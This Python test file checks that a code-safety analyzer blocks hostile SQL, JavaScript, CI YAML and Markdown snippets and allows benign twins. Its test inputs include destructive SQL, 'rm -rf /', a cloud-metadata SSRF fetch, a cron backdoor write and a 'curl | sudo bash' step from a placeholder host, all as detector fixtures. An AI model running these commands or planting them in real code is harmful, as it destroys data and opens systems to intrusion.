"""Regression tests for the SQL, JavaScript and YAML/Markdown analyzers.
Synthetic snippets only; malicious cases paired with benign twins."""
from engine.pipeline import evaluate


def verdict(code):
    return evaluate(code)["verdict"]


def cats(code):
    return set(evaluate(code)["categories"])


# ---------------- SQL
def test_sql_delete_no_where_blocks():
    assert verdict("DELETE FROM accounts;") == "block"


def test_sql_update_no_where_blocks():
    assert verdict("UPDATE accounts SET balance = 0;") == "block"
    assert "destructive_command" in cats("UPDATE accounts SET balance = 0;")


def test_sql_delete_with_where_is_safe():
    assert verdict("DELETE FROM accounts WHERE id = 42;") == "allow"


def test_sql_update_with_where_is_safe():
    assert verdict("UPDATE accounts SET balance = 0 WHERE id = 42;") == "allow"


def test_sql_drop_table_blocks():
    assert verdict("DROP TABLE customers;") == "block"


def test_sql_grant_all_blocks():
    assert verdict("GRANT ALL PRIVILEGES ON *.* TO 'app'@'%';") == "block"


def test_sql_select_is_safe():
    assert verdict("SELECT id, name FROM users WHERE active = 1;") == "allow"


def test_sql_comment_with_verb_is_safe():
    # a DROP mentioned only inside a comment must not fire
    assert verdict("SELECT 1; -- do not DROP TABLE here\n") == "allow"


# ---------------- JavaScript
def test_js_eval_blocks():
    assert verdict("const r = eval(userInput);") == "block"


def test_js_child_process_injection_blocks():
    code = "const cp = require('child_process');\ncp.execSync(`rm -rf ${dir}`);\n"
    assert verdict(code) == "block"


def test_js_fetch_metadata_blocks():
    assert verdict("fetch('http://169.254.169.254/latest/meta-data/')") == "block"
    assert "ssrf_network_exfil" in cats("fetch('http://169.254.169.254/latest/meta-data/')")


def test_js_normal_fetch_is_safe():
    assert verdict("fetch('https://api.example.com/v1/users').then(r => r.json())") == "allow"


def test_js_startup_persistence_blocks():
    code = "fs.writeFileSync('/etc/cron.d/backdoor', payload);"
    assert verdict(code) == "block"


# ---------------- YAML / Markdown
def test_yaml_run_curl_pipe_sh_blocks():
    code = ("jobs:\n  build:\n    steps:\n"
            "      - run: curl http://get.example/i.sh | sudo bash\n")
    assert verdict(code) == "block"


def test_yaml_benign_pipeline_is_safe():
    code = ("jobs:\n  test:\n    steps:\n"
            "      - run: pip install requests\n"
            "      - run: pytest -q\n")
    assert verdict(code) == "allow"


def test_markdown_malicious_code_fence_blocks():
    code = ("# Setup\n\nRun this:\n\n```bash\nrm -rf / --no-preserve-root\n```\n")
    assert verdict(code) == "block"


def test_markdown_benign_is_safe():
    code = ("# Readme\n\nInstall with:\n\n```bash\npip install requests\n```\n\nThen run the app.\n")
    assert verdict(code) == "allow"
